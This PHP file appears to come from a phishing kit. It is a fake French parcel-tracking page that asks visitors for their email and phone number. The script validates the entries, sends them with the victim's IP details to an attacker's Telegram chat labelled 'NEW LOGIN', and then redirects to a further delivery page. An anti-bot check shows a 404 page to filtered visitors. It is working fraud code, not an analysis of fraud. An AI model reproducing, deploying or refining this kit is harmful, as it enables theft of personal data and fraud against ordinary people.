<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['token']) && $_POST['token'] === $token) {
        if (empty($_POST['email'])) {
            return header('location: ./suivi?id=' . $token . '&empty');
        }
        $_SESSION['email'] = ($_POST['email']);
        if (empty($_POST['tel'])) {
            return header('location: ./suivi?id=' . $token . '&empty2');
        }
        $_SESSION['tel'] = ($_POST['tel']);


        if (
            !filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) ||
            !preg_match("/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/", $_POST['email'])
        ) {
            header('location: ./suivi?id=' . $token . '&invalidemail');
            return;
        }

        if (!preg_match("/^(0[1-9])(?:[ _.-]?(\d{2})){4}$/", $_POST['tel'])) {
            header('location: ./suivi?id=' . $token . '&invalidtel');
            return;
        }

        telegram_api($config['token'], 'sendMessage', [
            'chat_id' => $config['log'],
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    $btnBl
                ]
            ]),
            'text' => "<b>🇫🇷 NEW LOGIN</b>
                
📞 Phone <code>" . $_SESSION['tel'] . "</code>
📩 Email <code>" . $_SESSION['email'] . "</code>" . victim_infos($ip, $check),
            'parse_mode' => 'HTML'
        ]);
        header('location: /livraison?id=' . $token);
    }
} else {
    require_once(b . '/views/components/header.php');
?>
    <h2>Numéro de suivi : <?= $config['code'] ?></h2>
    <form method="post" novalidate='novalidate'>
        <input type="hidden" name="token" value="<?= htmlspecialchars($token) ?>" />
        <input type="hidden" name="form" value="true">
        <div class="fieldWrapper">
            <input type="text" value="<?= isset($_SESSION['email']) ? $_SESSION['email'] : '' ?>" id="first_step_form_email" name="email" required="required" placeholder="">
            <label for="first_step_form_email" class="required">Adresse e-mail</label>
        </div>
        <?php if (isset($_GET["empty"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <?php if (isset($_GET["invalidemail"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur n'est pas une adresse email valide.</p>
            </div>
        <?php } ?>
        <div class="fieldWrapper"><input type="tel" id="first_step_form_phone" name="tel" required="required" value="<?= isset($_SESSION['tel']) ? $_SESSION['tel'] : '' ?>" placeholder=""><label for="first_step_form_phone" class="required">Numéro de téléphone</label></div>
        <?php if (isset($_GET["empty2"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Cette valeur ne doit pas être vide.</p>
            </div>
        <?php } ?>
        <?php if (isset($_GET["invalidtel"])) { ?>
            <div class="notifications">
                <p class="notification notification-critical" role="alert">Le numéro de téléphone n'est pas valide.</p>
            </div>
        <?php } ?>
        <input type="hidden" name="form" value="true">

        <div>
            <button type="submit" id="tracking_form_submit">Suivre votre colis</button>
        </div>
    </form>
<?php
    require_once(b . '/views/components/footer.php');
}
